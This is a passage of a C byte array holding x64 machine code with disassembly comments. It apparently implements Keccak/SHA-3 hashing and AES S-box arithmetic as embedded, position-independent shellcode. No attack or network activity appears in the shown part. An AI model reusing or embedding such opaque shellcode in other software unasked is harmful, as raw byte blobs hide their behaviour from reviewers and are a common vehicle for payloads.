  /* 103D */ "\x48\x8b\xcb"                             /* mov rcx, rbx                       */
  /* 1040 */ "\xe8\x17\xfe\xff\xff"                     /* call 0xe5c                         */
  /* 1045 */ "\xeb\xb5"                                 /* jmp 0xffc                          */
  /* 1047 */ "\x48\x8b\xcb"                             /* mov rcx, rbx                       */
  /* 104A */ "\xe8\xed\xfe\xff\xff"                     /* call 0xf3c                         */
  /* 104F */ "\xeb\xab"                                 /* jmp 0xffc                          */
  /* 1051 */ "\x48\x8b\xcb"                             /* mov rcx, rbx                       */
  /* 1054 */ "\xe8\xcf\xfb\xff\xff"                     /* call 0xc28                         */
  /* 1059 */ "\xeb\xa1"                                 /* jmp 0xffc                          */
  /* 105B */ "\xcc"                                     /* int3                               */
  /* 105C */ "\x33\xc0"                                 /* xor eax, eax                       */
  /* 105E */ "\x4c\x8b\xc1"                             /* mov r8, rcx                        */
  /* 1061 */ "\x48\x89\x44\x24\x18"                     /* mov [rsp+0x18], rax                */
  /* 1066 */ "\x83\xfa\x40"                             /* cmp edx, 0x40                      */
  /* 1069 */ "\x73\x51"                                 /* jae 0x10bc                         */
  /* 106B */ "\x85\xd2"                                 /* test edx, edx                      */
  /* 106D */ "\x75\x04"                                 /* jnz 0x1073                         */
  /* 106F */ "\x48\x8b\xc1"                             /* mov rax, rcx                       */
  /* 1072 */ "\xc3"                                     /* ret                                */
  /* 1073 */ "\x41\xb9\x20\x00\x00\x00"                 /* mov r9d, 0x20                      */
  /* 1079 */ "\x41\x3b\xd1"                             /* cmp edx, r9d                       */
  /* 107C */ "\x73\x28"                                 /* jae 0x10a6                         */
  /* 107E */ "\x8b\xca"                                 /* mov ecx, edx                       */
  /* 1080 */ "\x41\x8b\xc0"                             /* mov eax, r8d                       */
  /* 1083 */ "\x44\x2b\xca"                             /* sub r9d, edx                       */
  /* 1086 */ "\xd3\xe0"                                 /* shl eax, cl                        */
  /* 1088 */ "\x41\x8a\xc9"                             /* mov cl, r9b                        */
  /* 108B */ "\x89\x44\x24\x18"                         /* mov [rsp+0x18], eax                */
  /* 108F */ "\x41\x8b\xc0"                             /* mov eax, r8d                       */
  /* 1092 */ "\x49\xc1\xe8\x20"                         /* shr r8, 0x20                       */
  /* 1096 */ "\xd3\xe8"                                 /* shr eax, cl                        */
  /* 1098 */ "\x8b\xca"                                 /* mov ecx, edx                       */
  /* 109A */ "\x41\xd3\xe0"                             /* shl r8d, cl                        */
  /* 109D */ "\x41\x0b\xc0"                             /* or eax, r8d                        */
  /* 10A0 */ "\x89\x44\x24\x1c"                         /* mov [rsp+0x1c], eax                */
  /* 10A4 */ "\xeb\x11"                                 /* jmp 0x10b7                         */
  /* 10A6 */ "\x83\xe2\x1f"                             /* and edx, 0x1f                      */
  /* 10A9 */ "\x89\x44\x24\x18"                         /* mov [rsp+0x18], eax                */
  /* 10AD */ "\x8a\xca"                                 /* mov cl, dl                         */
  /* 10AF */ "\x41\xd3\xe0"                             /* shl r8d, cl                        */
  /* 10B2 */ "\x44\x89\x44\x24\x1c"                     /* mov [rsp+0x1c], r8d                */
  /* 10B7 */ "\x48\x8b\x44\x24\x18"                     /* mov rax, [rsp+0x18]                */
  /* 10BC */ "\xc3"                                     /* ret                                */
  /* 10BD */ "\xcc"                                     /* int3                               */
  /* 10BE */ "\xcc"                                     /* int3                               */
  /* 10BF */ "\xcc"                                     /* int3                               */
  /* 10C0 */ "\x33\xc0"                                 /* xor eax, eax                       */
  /* 10C2 */ "\x44\x8b\xc2"                             /* mov r8d, edx                       */
  /* 10C5 */ "\x4c\x8b\xc9"                             /* mov r9, rcx                        */
  /* 10C8 */ "\x48\x89\x44\x24\x18"                     /* mov [rsp+0x18], rax                */
  /* 10CD */ "\x83\xfa\x40"                             /* cmp edx, 0x40                      */
  /* 10D0 */ "\x73\x4d"                                 /* jae 0x111f                         */
  /* 10D2 */ "\x85\xd2"                                 /* test edx, edx                      */
  /* 10D4 */ "\x75\x04"                                 /* jnz 0x10da                         */
  /* 10D6 */ "\x48\x8b\xc1"                             /* mov rax, rcx                       */
  /* 10D9 */ "\xc3"                                     /* ret                                */
  /* 10DA */ "\x41\xba\x20\x00\x00\x00"                 /* mov r10d, 0x20                     */
  /* 10E0 */ "\x49\xc1\xe9\x20"                         /* shr r9, 0x20                       */
  /* 10E4 */ "\x41\x3b\xd2"                             /* cmp edx, r10d                      */
  /* 10E7 */ "\x73\x1e"                                 /* jae 0x1107                         */
  /* 10E9 */ "\x8b\xd1"                                 /* mov edx, ecx                       */
  /* 10EB */ "\x41\x8b\xc8"                             /* mov ecx, r8d                       */
  /* 10EE */ "\x41\x8b\xc1"                             /* mov eax, r9d                       */
  /* 10F1 */ "\x45\x2b\xd0"                             /* sub r10d, r8d                      */
  /* 10F4 */ "\xd3\xea"                                 /* shr edx, cl                        */
  /* 10F6 */ "\xd3\xe8"                                 /* shr eax, cl                        */
  /* 10F8 */ "\x41\x8a\xca"                             /* mov cl, r10b                       */
  /* 10FB */ "\x41\xd3\xe1"                             /* shl r9d, cl                        */
  /* 10FE */ "\x41\x0b\xd1"                             /* or edx, r9d                        */
  /* 1101 */ "\x89\x54\x24\x18"                         /* mov [rsp+0x18], edx                */
  /* 1105 */ "\xeb\x0f"                                 /* jmp 0x1116                         */
  /* 1107 */ "\x41\x83\xe0\x1f"                         /* and r8d, 0x1f                      */
  /* 110B */ "\x41\x8a\xc8"                             /* mov cl, r8b                        */
  /* 110E */ "\x41\xd3\xe9"                             /* shr r9d, cl                        */
  /* 1111 */ "\x44\x89\x4c\x24\x18"                     /* mov [rsp+0x18], r9d                */
  /* 1116 */ "\x89\x44\x24\x1c"                         /* mov [rsp+0x1c], eax                */
  /* 111A */ "\x48\x8b\x44\x24\x18"                     /* mov rax, [rsp+0x18]                */
  /* 111F */ "\xc3"                                     /* ret                                */
  /* 1120 */ "\x48\x89\x5c\x24\x08"                     /* mov [rsp+0x8], rbx                 */
  /* 1125 */ "\x57"                                     /* push rdi                           */
  /* 1126 */ "\x48\x83\xec\x20"                         /* sub rsp, 0x20                      */
  /* 112A */ "\x44\x0f\xb6\x11"                         /* movzx r10d, byte [rcx]             */
  /* 112E */ "\x45\x33\xdb"                             /* xor r11d, r11d                     */
  /* 1131 */ "\x48\x8b\xd9"                             /* mov rbx, rcx                       */
  /* 1134 */ "\x41\x8d\x7b\x01"                         /* lea edi, [r11+0x1]                 */
  /* 1138 */ "\x41\xf6\xc2\x01"                         /* test r10b, 0x1                     */
  /* 113C */ "\x74\x10"                                 /* jz 0x114e                          */
  /* 113E */ "\x8d\x57\xff"                             /* lea edx, [rdi-0x1]                 */
  /* 1141 */ "\xb9\x01\x00\x00\x00"                     /* mov ecx, 0x1                       */
  /* 1146 */ "\xe8\x11\xff\xff\xff"                     /* call 0x105c                        */
  /* 114B */ "\x4c\x33\xd8"                             /* xor r11, rax                       */
  /* 114E */ "\x43\x8d\x14\x12"                         /* lea edx, [r10+r10]                 */
  /* 1152 */ "\x45\x8b\xc2"                             /* mov r8d, r10d                      */
  /* 1155 */ "\x8b\xca"                                 /* mov ecx, edx                       */
  /* 1157 */ "\x44\x8b\xd2"                             /* mov r10d, edx                      */
  /* 115A */ "\x83\xf1\x71"                             /* xor ecx, 0x71                      */
  /* 115D */ "\x41\x80\xe0\x80"                         /* and r8b, 0x80                      */
  /* 1161 */ "\x44\x0f\x45\xd1"                         /* cmovnz r10d, ecx                   */
  /* 1165 */ "\x03\xff"                                 /* add edi, edi                       */
  /* 1167 */ "\x81\xff\x80\x00\x00\x00"                 /* cmp edi, 0x80                      */
  /* 116D */ "\x72\xc9"                                 /* jb 0x1138                          */
  /* 116F */ "\x44\x88\x13"                             /* mov [rbx], r10b                    */
  /* 1172 */ "\x48\x8b\x5c\x24\x30"                     /* mov rbx, [rsp+0x30]                */
  /* 1177 */ "\x49\x8b\xc3"                             /* mov rax, r11                       */
  /* 117A */ "\x48\x83\xc4\x20"                         /* add rsp, 0x20                      */
  /* 117E */ "\x5f"                                     /* pop rdi                            */
  /* 117F */ "\xc3"                                     /* ret                                */
  /* 1180 */ "\x40\x55"                                 /* push rbp                           */
  /* 1182 */ "\x53"                                     /* push rbx                           */
  /* 1183 */ "\x56"                                     /* push rsi                           */
  /* 1184 */ "\x57"                                     /* push rdi                           */
  /* 1185 */ "\x41\x54"                                 /* push r12                           */
  /* 1187 */ "\x41\x55"                                 /* push r13                           */
  /* 1189 */ "\x41\x56"                                 /* push r14                           */
  /* 118B */ "\x41\x57"                                 /* push r15                           */
  /* 118D */ "\x48\x8b\xec"                             /* mov rbp, rsp                       */
  /* 1190 */ "\x48\x83\xec\x68"                         /* sub rsp, 0x68                      */
  /* 1194 */ "\x4c\x8d\x61\x0c"                         /* lea r12, [rcx+0xc]                 */
  /* 1198 */ "\x48\x8d\x7d\xd0"                         /* lea rdi, [rbp-0x30]                */
  /* 119C */ "\xc6\x45\x48\x01"                         /* mov byte [rbp+0x48], 0x1           */
  /* 11A0 */ "\x49\x2b\xfc"                             /* sub rdi, r12                       */
  /* 11A3 */ "\xc7\x45\xb8\x0a\x07\x0b\x11"             /* mov dword [rbp-0x48], 0x110b070a   */
  /* 11AA */ "\x41\xbd\x05\x00\x00\x00"                 /* mov r13d, 0x5                      */
  /* 11B0 */ "\xc7\x45\xbc\x12\x03\x05\x10"             /* mov dword [rbp-0x44], 0x10050312   */
  /* 11B7 */ "\xc7\x45\xc0\x08\x15\x18\x04"             /* mov dword [rbp-0x40], 0x4181508    */
  /* 11BE */ "\xc7\x45\xc4\x0f\x17\x13\x0d"             /* mov dword [rbp-0x3c], 0xd13170f    */
  /* 11C5 */ "\x48\x89\x7d\x60"                         /* mov [rbp+0x60], rdi                */
  /* 11C9 */ "\xc7\x45\xc8\x0c\x02\x14\x0e"             /* mov dword [rbp-0x38], 0xe14020c    */
  /* 11D0 */ "\xc7\x45\xcc\x16\x09\x06\x01"             /* mov dword [rbp-0x34], 0x1060916    */
  /* 11D7 */ "\x49\x8d\x44\x24\x78"                     /* lea rax, [r12+0x78]                */
  /* 11DC */ "\x48\xc7\x45\x58\x18\x00\x00\x00"         /* mov qword [rbp+0x58], 0x18         */
  /* 11E4 */ "\x41\xbe\xcd\xcc\xcc\xcc"                 /* mov r14d, 0xcccccccd               */
  /* 11EA */ "\x48\x8b\xc8"                             /* mov rcx, rax                       */
  /* 11ED */ "\x49\x8b\xd5"                             /* mov rdx, r13                       */
  /* 11F0 */ "\x48\x8b\x41\x88"                         /* mov rax, [rcx-0x78]                */
  /* 11F4 */ "\x48\x33\x41\xb0"                         /* xor rax, [rcx-0x50]                */
  /* 11F8 */ "\x48\x33\x41\xd8"                         /* xor rax, [rcx-0x28]                */
  /* 11FC */ "\x48\x33\x41\x28"                         /* xor rax, [rcx+0x28]                */
  /* 1200 */ "\x48\x33\x01"                             /* xor rax, [rcx]                     */
  /* 1203 */ "\x48\x83\xc1\x08"                         /* add rcx, 0x8                       */
  /* 1207 */ "\x48\xff\xca"                             /* dec rdx                            */
  /* 120A */ "\x48\x89\x44\x0f\x80"                     /* mov [rdi+rcx-0x80], rax            */
  /* 120F */ "\x75\xdf"                                 /* jnz 0x11f0                         */
  /* 1211 */ "\x8d\x72\x04"                             /* lea esi, [rdx+0x4]                 */
  /* 1214 */ "\x4d\x8b\xdc"                             /* mov r11, r12                       */
  /* 1217 */ "\x49\x8b\xdd"                             /* mov rbx, r13                       */
  /* 121A */ "\x8d\x4e\xfd"                             /* lea ecx, [rsi-0x3]                 */
  /* 121D */ "\x41\x8b\xc6"                             /* mov eax, r14d                      */
  /* 1220 */ "\xf7\xe1"                                 /* mul ecx                            */
  /* 1222 */ "\xc1\xea\x02"                             /* shr edx, 0x2                       */
  /* 1225 */ "\x8d\x04\x92"                             /* lea eax, [rdx+rdx*4]               */
  /* 1228 */ "\xba\x3f\x00\x00\x00"                     /* mov edx, 0x3f                      */
  /* 122D */ "\x2b\xc8"                                 /* sub ecx, eax                       */
  /* 122F */ "\x48\x8b\x7c\xcd\xd0"                     /* mov rdi, [rbp+rcx*8-0x30]          */
  /* 1234 */ "\x48\x8b\xcf"                             /* mov rcx, rdi                       */
  /* 1237 */ "\xe8\x84\xfe\xff\xff"                     /* call 0x10c0                        */
  /* 123C */ "\xba\x01\x00\x00\x00"                     /* mov edx, 0x1                       */
  /* 1241 */ "\x48\x8b\xcf"                             /* mov rcx, rdi                       */
  /* 1244 */ "\x4c\x8b\xd0"                             /* mov r10, rax                       */
  /* 1247 */ "\xe8\x10\xfe\xff\xff"                     /* call 0x105c                        */
  /* 124C */ "\x8b\xce"                                 /* mov ecx, esi                       */
  /* 124E */ "\x4c\x0b\xd0"                             /* or r10, rax                        */
  /* 1251 */ "\x41\x8b\xc6"                             /* mov eax, r14d                      */
  /* 1254 */ "\xf7\xe6"                                 /* mul esi                            */
  /* 1256 */ "\xc1\xea\x02"                             /* shr edx, 0x2                       */
  /* 1259 */ "\x8d\x04\x92"                             /* lea eax, [rdx+rdx*4]               */
  /* 125C */ "\x2b\xc8"                                 /* sub ecx, eax                       */
  /* 125E */ "\x49\x8b\xc3"                             /* mov rax, r11                       */
  /* 1261 */ "\x4c\x33\x54\xcd\xd0"                     /* xor r10, [rbp+rcx*8-0x30]          */
  /* 1266 */ "\x49\x8b\xcd"                             /* mov rcx, r13                       */
  /* 1269 */ "\x4c\x31\x10"                             /* xor [rax], r10                     */
  /* 126C */ "\x48\x83\xc0\x28"                         /* add rax, 0x28                      */
  /* 1270 */ "\x48\xff\xc9"                             /* dec rcx                            */
  /* 1273 */ "\x75\xf4"                                 /* jnz 0x1269                         */
  /* 1275 */ "\xff\xc6"                                 /* inc esi                            */
  /* 1277 */ "\x49\x83\xc3\x08"                         /* add r11, 0x8                       */
  /* 127B */ "\x48\xff\xcb"                             /* dec rbx                            */
  /* 127E */ "\x75\x9a"                                 /* jnz 0x121a                         */
  /* 1280 */ "\x49\x8b\x4c\x24\x08"                     /* mov rcx, [r12+0x8]                 */
  /* 1285 */ "\x45\x33\xed"                             /* xor r13d, r13d                     */
  /* 1288 */ "\x4c\x8d\x7d\xb8"                         /* lea r15, [rbp-0x48]                */
  /* 128C */ "\x48\x89\x4d\x50"                         /* mov [rbp+0x50], rcx                */
  /* 1290 */ "\x45\x33\xf6"                             /* xor r14d, r14d                     */
  /* 1293 */ "\x41\x0f\xb6\x07"                         /* movzx eax, byte [r15]              */
  /* 1297 */ "\xba\x40\x00\x00\x00"                     /* mov edx, 0x40                      */
  /* 129C */ "\x47\x8d\x74\x2e\x01"                     /* lea r14d, [r14+r13+0x1]            */
  /* 12A1 */ "\x4d\x8b\x1c\xc4"                         /* mov r11, [r12+rax*8]               */
  /* 12A5 */ "\x41\x8b\xf6"                             /* mov esi, r14d                      */
  /* 12A8 */ "\x8b\xd8"                                 /* mov ebx, eax                       */
  /* 12AA */ "\x83\xe6\x3f"                             /* and esi, 0x3f                      */
  /* 12AD */ "\x4c\x89\x5d\xd0"                         /* mov [rbp-0x30], r11                */
  /* 12B1 */ "\x2b\xd6"                                 /* sub edx, esi                       */
  /* 12B3 */ "\xe8\x08\xfe\xff\xff"                     /* call 0x10c0                        */
  /* 12B8 */ "\x48\x8b\x4d\x50"                         /* mov rcx, [rbp+0x50]                */
  /* 12BC */ "\x8b\xd6"                                 /* mov edx, esi                       */
  /* 12BE */ "\x48\x8b\xf8"                             /* mov rdi, rax                       */
  /* 12C1 */ "\xe8\x96\xfd\xff\xff"                     /* call 0x105c                        */
  /* 12C6 */ "\x41\xff\xc5"                             /* inc r13d                           */
  /* 12C9 */ "\x48\x0b\xf8"                             /* or rdi, rax                        */
  /* 12CC */ "\x49\x8b\xcb"                             /* mov rcx, r11                       */
  /* 12CF */ "\x49\xff\xc7"                             /* inc r15                            */
  /* 12D2 */ "\x49\x89\x3c\xdc"                         /* mov [r12+rbx*8], rdi               */
  /* 12D6 */ "\x48\x89\x4d\x50"                         /* mov [rbp+0x50], rcx                */
  /* 12DA */ "\x41\x83\xfd\x18"                         /* cmp r13d, 0x18                     */
  /* 12DE */ "\x72\xb3"                                 /* jb 0x1293                          */
  /* 12E0 */ "\x41\xbd\x05\x00\x00\x00"                 /* mov r13d, 0x5                      */
  /* 12E6 */ "\x4d\x8b\xc4"                             /* mov r8, r12                        */
  /* 12E9 */ "\x4d\x8b\xcc"                             /* mov r9, r12                        */
  /* 12EC */ "\x45\x8b\xd5"                             /* mov r10d, r13d                     */
  /* 12EF */ "\x41\xbe\xcd\xcc\xcc\xcc"                 /* mov r14d, 0xcccccccd               */
  /* 12F5 */ "\x48\x8d\x7d\xd0"                         /* lea rdi, [rbp-0x30]                */
  /* 12F9 */ "\x49\x8b\xf1"                             /* mov rsi, r9                        */
  /* 12FC */ "\xb9\x28\x00\x00\x00"                     /* mov ecx, 0x28                      */
  /* 1301 */ "\xf3\xa4"                                 /* rep movsb                          */
  /* 1303 */ "\xbe\x02\x00\x00\x00"                     /* mov esi, 0x2                       */
  /* 1308 */ "\x4d\x8b\xdd"                             /* mov r11, r13                       */
  /* 130B */ "\x8d\x4e\xff"                             /* lea ecx, [rsi-0x1]                 */
  /* 130E */ "\x41\x8b\xc6"                             /* mov eax, r14d                      */
  /* 1311 */ "\xf7\xe1"                                 /* mul ecx                            */
  /* 1313 */ "\xc1\xea\x02"                             /* shr edx, 0x2                       */
  /* 1316 */ "\x8d\x04\x92"                             /* lea eax, [rdx+rdx*4]               */
  /* 1319 */ "\x2b\xc8"                                 /* sub ecx, eax                       */
  /* 131B */ "\x41\x8b\xc6"                             /* mov eax, r14d                      */
  /* 131E */ "\x48\x8b\x7c\xcd\xd0"                     /* mov rdi, [rbp+rcx*8-0x30]          */
  /* 1323 */ "\x8b\xce"                                 /* mov ecx, esi                       */
  /* 1325 */ "\xf7\xe6"                                 /* mul esi                            */
  /* 1327 */ "\xc1\xea\x02"                             /* shr edx, 0x2                       */
  /* 132A */ "\x48\xf7\xd7"                             /* not rdi                            */
  /* 132D */ "\x8d\x04\x92"                             /* lea eax, [rdx+rdx*4]               */
  /* 1330 */ "\xff\xc6"                                 /* inc esi                            */
  /* 1332 */ "\x2b\xc8"                                 /* sub ecx, eax                       */
  /* 1334 */ "\x48\x23\x7c\xcd\xd0"                     /* and rdi, [rbp+rcx*8-0x30]          */
  /* 1339 */ "\x49\x31\x38"                             /* xor [r8], rdi                      */
  /* 133C */ "\x49\x83\xc0\x08"                         /* add r8, 0x8                        */
  /* 1340 */ "\x49\xff\xcb"                             /* dec r11                            */
  /* 1343 */ "\x75\xc6"                                 /* jnz 0x130b                         */
  /* 1345 */ "\x49\x83\xc1\x28"                         /* add r9, 0x28                       */
  /* 1349 */ "\x49\xff\xca"                             /* dec r10                            */
  /* 134C */ "\x75\xa7"                                 /* jnz 0x12f5                         */
  /* 134E */ "\x48\x8d\x4d\x48"                         /* lea rcx, [rbp+0x48]                */
  /* 1352 */ "\xe8\xc9\xfd\xff\xff"                     /* call 0x1120                        */
  /* 1357 */ "\x48\x8b\x7d\x60"                         /* mov rdi, [rbp+0x60]                */
  /* 135B */ "\x49\x31\x04\x24"                         /* xor [r12], rax                     */
  /* 135F */ "\x48\xff\x4d\x58"                         /* dec qword [rbp+0x58]               */
  /* 1363 */ "\x49\x8d\x44\x24\x78"                     /* lea rax, [r12+0x78]                */
  /* 1368 */ "\x0f\x85\x7c\xfe\xff\xff"                 /* jnz 0x11ea                         */
  /* 136E */ "\x48\x83\xc4\x68"                         /* add rsp, 0x68                      */
  /* 1372 */ "\x41\x5f"                                 /* pop r15                            */
  /* 1374 */ "\x41\x5e"                                 /* pop r14                            */
  /* 1376 */ "\x41\x5d"                                 /* pop r13                            */
  /* 1378 */ "\x41\x5c"                                 /* pop r12                            */
  /* 137A */ "\x5f"                                     /* pop rdi                            */
  /* 137B */ "\x5e"                                     /* pop rsi                            */
  /* 137C */ "\x5b"                                     /* pop rbx                            */
  /* 137D */ "\x5d"                                     /* pop rbp                            */
  /* 137E */ "\xc3"                                     /* ret                                */
  /* 137F */ "\xcc"                                     /* int3                               */
  /* 1380 */ "\x48\x89\x7c\x24\x08"                     /* mov [rsp+0x8], rdi                 */
  /* 1385 */ "\x83\x61\x08\x00"                         /* and dword [rcx+0x8], 0x0           */
  /* 1389 */ "\x48\x8d\x79\x0c"                         /* lea rdi, [rcx+0xc]                 */
  /* 138D */ "\x89\x11"                                 /* mov [rcx], edx                     */
  /* 138F */ "\xb8\x64\x00\x00\x00"                     /* mov eax, 0x64                      */
  /* 1394 */ "\x2b\xc2"                                 /* sub eax, edx                       */
  /* 1396 */ "\x03\xc0"                                 /* add eax, eax                       */
  /* 1398 */ "\x89\x41\x04"                             /* mov [rcx+0x4], eax                 */
  /* 139B */ "\x33\xc0"                                 /* xor eax, eax                       */
  /* 139D */ "\xb9\xc8\x00\x00\x00"                     /* mov ecx, 0xc8                      */
  /* 13A2 */ "\xf3\xaa"                                 /* rep stosb                          */
  /* 13A4 */ "\x48\x8b\x7c\x24\x08"                     /* mov rdi, [rsp+0x8]                 */
  /* 13A9 */ "\xc3"                                     /* ret                                */
  /* 13AA */ "\xcc"                                     /* int3                               */
  /* 13AB */ "\xcc"                                     /* int3                               */
  /* 13AC */ "\x45\x85\xc0"                             /* test r8d, r8d                      */
  /* 13AF */ "\x74\x4f"                                 /* jz 0x1400                          */
  /* 13B1 */ "\x48\x89\x5c\x24\x08"                     /* mov [rsp+0x8], rbx                 */
  /* 13B6 */ "\x48\x89\x74\x24\x10"                     /* mov [rsp+0x10], rsi                */
  /* 13BB */ "\x57"                                     /* push rdi                           */
  /* 13BC */ "\x48\x83\xec\x20"                         /* sub rsp, 0x20                      */
  /* 13C0 */ "\x48\x8b\xfa"                             /* mov rdi, rdx                       */
  /* 13C3 */ "\x48\x8b\xd9"                             /* mov rbx, rcx                       */
  /* 13C6 */ "\x41\x8b\xf0"                             /* mov esi, r8d                       */
  /* 13C9 */ "\x8a\x07"                                 /* mov al, [rdi]                      */
  /* 13CB */ "\x8b\x53\x08"                             /* mov edx, [rbx+0x8]                 */
  /* 13CE */ "\x30\x44\x1a\x0c"                         /* xor [rdx+rbx+0xc], al              */
  /* 13D2 */ "\xff\x43\x08"                             /* inc dword [rbx+0x8]                */
  /* 13D5 */ "\x8b\x43\x08"                             /* mov eax, [rbx+0x8]                 */
  /* 13D8 */ "\x3b\x43\x04"                             /* cmp eax, [rbx+0x4]                 */
  /* 13DB */ "\x75\x0c"                                 /* jnz 0x13e9                         */
  /* 13DD */ "\x48\x8b\xcb"                             /* mov rcx, rbx                       */
  /* 13E0 */ "\xe8\x9b\xfd\xff\xff"                     /* call 0x1180                        */
  /* 13E5 */ "\x83\x63\x08\x00"                         /* and dword [rbx+0x8], 0x0           */
  /* 13E9 */ "\x48\xff\xc7"                             /* inc rdi                            */
  /* 13EC */ "\x48\xff\xce"                             /* dec rsi                            */
  /* 13EF */ "\x75\xd8"                                 /* jnz 0x13c9                         */
  /* 13F1 */ "\x48\x8b\x5c\x24\x30"                     /* mov rbx, [rsp+0x30]                */
  /* 13F6 */ "\x48\x8b\x74\x24\x38"                     /* mov rsi, [rsp+0x38]                */
  /* 13FB */ "\x48\x83\xc4\x20"                         /* add rsp, 0x20                      */
  /* 13FF */ "\x5f"                                     /* pop rdi                            */
  /* 1400 */ "\xc3"                                     /* ret                                */
  /* 1401 */ "\xcc"                                     /* int3                               */
  /* 1402 */ "\xcc"                                     /* int3                               */
  /* 1403 */ "\xcc"                                     /* int3                               */
  /* 1404 */ "\x48\x89\x74\x24\x08"                     /* mov [rsp+0x8], rsi                 */
  /* 1409 */ "\x57"                                     /* push rdi                           */
  /* 140A */ "\x48\x83\xec\x20"                         /* sub rsp, 0x20                      */
  /* 140E */ "\x8b\x42\x08"                             /* mov eax, [rdx+0x8]                 */
  /* 1411 */ "\x48\x8b\xf9"                             /* mov rdi, rcx                       */
  /* 1414 */ "\x48\x8b\xca"                             /* mov rcx, rdx                       */
  /* 1417 */ "\x80\x74\x10\x0c\x06"                     /* xor byte [rax+rdx+0xc], 0x6        */
  /* 141C */ "\x8b\x42\x04"                             /* mov eax, [rdx+0x4]                 */
  /* 141F */ "\x48\x8b\xf2"                             /* mov rsi, rdx                       */
  /* 1422 */ "\xff\xc8"                                 /* dec eax                            */
  /* 1424 */ "\x80\x74\x10\x0c\x80"                     /* xor byte [rax+rdx+0xc], 0x80       */
  /* 1429 */ "\xe8\x52\xfd\xff\xff"                     /* call 0x1180                        */
  /* 142E */ "\x8b\x0e"                                 /* mov ecx, [rsi]                     */
  /* 1430 */ "\x48\x83\xc6\x0c"                         /* add rsi, 0xc                       */
  /* 1434 */ "\xf3\xa4"                                 /* rep movsb                          */
  /* 1436 */ "\x48\x8b\x74\x24\x30"                     /* mov rsi, [rsp+0x30]                */
  /* 143B */ "\x48\x83\xc4\x20"                         /* add rsp, 0x20                      */
  /* 143F */ "\x5f"                                     /* pop rdi                            */
  /* 1440 */ "\xc3"                                     /* ret                                */
  /* 1441 */ "\xcc"                                     /* int3                               */
  /* 1442 */ "\xcc"                                     /* int3                               */
  /* 1443 */ "\xcc"                                     /* int3                               */
  /* 1444 */ "\x45\x32\xc0"                             /* xor r8b, r8b                       */
  /* 1447 */ "\x44\x8a\xc9"                             /* mov r9b, cl                        */
  /* 144A */ "\x84\xc9"                                 /* test cl, cl                        */
  /* 144C */ "\x74\x5d"                                 /* jz 0x14ab                          */
  /* 144E */ "\x41\xb2\x03"                             /* mov r10b, 0x3                      */
  /* 1451 */ "\x41\xbb\x80\x80\x80\x80"                 /* mov r11d, 0x80808080               */
  /* 1457 */ "\x41\x3a\xca"                             /* cmp cl, r10b                       */
  /* 145A */ "\x74\x21"                                 /* jz 0x147d                          */
  /* 145C */ "\x41\x0f\xb6\xd2"                         /* movzx edx, r10b                    */
  /* 1460 */ "\xb0\x1b"                                 /* mov al, 0x1b                       */
  /* 1462 */ "\x41\xfe\xc0"                             /* inc r8b                            */
  /* 1465 */ "\x8b\xca"                                 /* mov ecx, edx                       */
  /* 1467 */ "\x41\x23\xcb"                             /* and ecx, r11d                      */
  /* 146A */ "\x32\xd1"                                 /* xor dl, cl                         */
  /* 146C */ "\xc1\xe9\x07"                             /* shr ecx, 0x7                       */
  /* 146F */ "\x02\xd2"                                 /* add dl, dl                         */
  /* 1471 */ "\xf6\xe9"                                 /* imul cl                            */
  /* 1473 */ "\x32\xd0"                                 /* xor dl, al                         */
  /* 1475 */ "\x44\x32\xd2"                             /* xor r10b, dl                       */
  /* 1478 */ "\x45\x3a\xd1"                             /* cmp r10b, r9b                      */
  /* 147B */ "\x75\xdf"                                 /* jnz 0x145c                         */
  /* 147D */ "\x41\x80\xc0\x02"                         /* add r8b, 0x2                       */
  /* 1481 */ "\x41\xb1\x01"                             /* mov r9b, 0x1                       */
  /* 1484 */ "\x74\x25"                                 /* jz 0x14ab                          */
  /* 1486 */ "\x41\xf6\xd8"                             /* neg r8b                            */
  /* 1489 */ "\x45\x0f\xb6\xd0"                         /* movzx r10d, r8b                    */
  /* 148D */ "\x41\x0f\xb6\xd1"                         /* movzx edx, r9b                     */
  /* 1491 */ "\xb0\x1b"                                 /* mov al, 0x1b                       */
  /* 1493 */ "\x8b\xca"                                 /* mov ecx, edx                       */
  /* 1495 */ "\x41\x23\xcb"                             /* and ecx, r11d                      */
  /* 1498 */ "\x32\xd1"                                 /* xor dl, cl                         */
  /* 149A */ "\xc1\xe9\x07"                             /* shr ecx, 0x7                       */
  /* 149D */ "\x02\xd2"                                 /* add dl, dl                         */
  /* 149F */ "\xf6\xe9"                                 /* imul cl                            */
  /* 14A1 */ "\x32\xd0"                                 /* xor dl, al                         */
  /* 14A3 */ "\x44\x32\xca"                             /* xor r9b, dl                        */
  /* 14A6 */ "\x49\xff\xca"                             /* dec r10                            */
  /* 14A9 */ "\x75\xe2"                                 /* jnz 0x148d                         */
  /* 14AB */ "\x41\x8a\xc1"                             /* mov al, r9b                        */
  /* 14AE */ "\xc3"                                     /* ret                                */
  /* 14AF */ "\xcc"                                     /* int3                               */
  /* 14B0 */ "\x48\x83\xec\x28"                         /* sub rsp, 0x28                      */
  /* 14B4 */ "\x44\x8a\xc1"                             /* mov r8b, cl                        */
  /* 14B7 */ "\x83\xfa\x01"                             /* cmp edx, 0x1                       */
  /* 14BA */ "\x75\x1f"                                 /* jnz 0x14db                         */
  /* 14BC */ "\xe8\x83\xff\xff\xff"                     /* call 0x1444                        */
  /* 14C1 */ "\xb9\x04\x00\x00\x00"                     /* mov ecx, 0x4                       */
  /* 14C6 */ "\x44\x8a\xd8"                             /* mov r11b, al                       */
  /* 14C9 */ "\x41\xd0\xc3"                             /* rol r11b, 1                        */
  /* 14CC */ "\x41\x32\xc3"                             /* xor al, r11b                       */
  /* 14CF */ "\x48\xff\xc9"                             /* dec rcx                            */
  /* 14D2 */ "\x75\xf5"                                 /* jnz 0x14c9                         */
  /* 14D4 */ "\x34\x63"                                 /* xor al, 0x63                       */
  /* 14D6 */ "\x48\x83\xc4\x28"                         /* add rsp, 0x28                      */
  /* 14DA */ "\xc3"                                     /* ret                                */
  /* 14DB */ "\x41\x80\xf0\x63"                         /* xor r8b, 0x63                      */
  /* 14DF */ "\x41\xd0\xc0"                             /* rol r8b, 1                         */
  /* 14E2 */ "\x41\x8a\xc0"                             /* mov al, r8b                        */
  /* 14E5 */ "\xc0\xc0\x02"                             /* rol al, 0x2                        */
  /* 14E8 */ "\x8a\xc8"                                 /* mov cl, al                         */
  /* 14EA */ "\xc0\xc1\x03"                             /* rol cl, 0x3                        */
  /* 14ED */ "\x41\x32\xc8"                             /* xor cl, r8b                        */
  /* 14F0 */ "\x32\xc8"                                 /* xor cl, al                         */
